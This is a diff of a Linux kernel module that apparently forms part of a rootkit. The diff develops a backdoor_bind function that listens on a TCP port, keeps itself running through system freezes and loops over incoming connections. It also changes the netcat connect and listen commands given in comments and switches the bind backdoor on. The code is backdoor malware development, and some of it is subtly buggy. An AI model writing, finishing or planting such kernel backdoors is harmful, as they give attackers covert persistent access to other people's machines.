@@ -73,14 +73,14 @@ static int rk_recvbuff(struct socket *sock, char *buffer, int length)
     len = sock_recvmsg(sock,&msg,length,0); //no wait
     set_fs(oldfs);
 
-    if ((len!=-EAGAIN)&&(len!=0))
+    if ((len!=-EAGAIN)&&(len!=0)&&(len!=(-107)))
         printk("rk_recvbuff recieved %i bytes \n",len);
     return len;
 }
 
 static void backdoor_reverse(void) {
 
-    /* client bind with : nc -lvp 4242 */
+    /* client bind with : nc -lvp 2424 */
 
     struct socket *sock;
     struct sockaddr_in sin;
@@ -149,44 +149,70 @@ static void backdoor_reverse(void) {
 
 static void backdoor_bind(void) {
 
-    /* client connect with : nc 127.0.0.1 4243 */
+    /* client connect with : nc 127.0.0.1 5000 */
 
     struct socket *sock;
     struct sockaddr_in sin;
     int error;
-    int sysctl_ktcpvs_max_backlog = 2048;
+    current->flags |= PF_NOFREEZE;
 
-    /* First create a socket */
     error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (error < 0) {
         printk("Error during creation of socket; terminating\n");
+        return;
     }
 
     sin.sin_family = AF_INET;
     sin.sin_addr.s_addr = in_aton("127.0.0.1");
-    sin.sin_port = htons(4243);
+    sin.sin_port = htons(5000);
 
     error = sock->ops->bind(sock, (struct sockaddr *) &sin, sizeof(sin));
     if (error < 0) {
-        printk("Error binding socket. This means that some "
-         "other daemon is (or was a short time ago) "
-         "using");
+        printk("Error binding socket\n");
         sock_release(sock);
+        return;
     }
 
-    /* Now, start listening on the socket */
-    error = sock->ops->listen(sock, sysctl_ktcpvs_max_backlog);
-    if (error != 0) {
-        printk("ktcpvs: Error listening on socket \n");
+    error = sock->ops->listen(sock, 5);
+    if (error < 0) {
+        printk("Error listening on socket \n");
         sock_release(sock);
+        return;
+    }
+    char *buff = NULL;
+    buff = kmalloc(512, GFP_KERNEL);
+    int tt = 0;
+    struct socket *newsock;
+    newsock=(struct socket*)kmalloc(sizeof(struct socket),GFP_KERNEL);
+    error = sock_create(PF_INET,SOCK_STREAM,IPPROTO_TCP,&newsock);
+    if(error<0) {
+        printk("Error create newsock error\n");
+        kfree(buff);
+        sock_release(sock);  
+        return; 
+    }
+    //wait incoming connection
+    while (1) {
+        error = newsock->ops->accept(sock,newsock,O_NONBLOCK);
+        if(error >= 0) {
+            while(tt = rk_recvbuff(newsock, buff, 512)) {
+                if (tt > 0) {
+                    rk_sendbuff(newsock, buff, tt);
+                    memset(buff, '\0', sizeof(buff)); // clean the buffer
+                    tt = 0;
+                }
+                if(signal_pending(current)) {
+                    break;
+                }
+            }
+        }
+        if(signal_pending(current)) {
+            break;
+        }
     }
 
-    // struct socket * newsock;
-    // newsock->type = sock->type;
-    // newsock->ops=sock->ops;
-    // newsock->ops->accept(sock,newsock,0);
-
-
+    kfree(buff);
+    sock_release(newsock); 
     sock_release(sock);    
 
 }
@@ -202,6 +228,5 @@ void backdoor(void) {
     //backdoor_reverse();
 
     /* TODO ACTIVATOR BACKDOOR */
-    // caution don't, please don't
     backdoor_bind();
 }
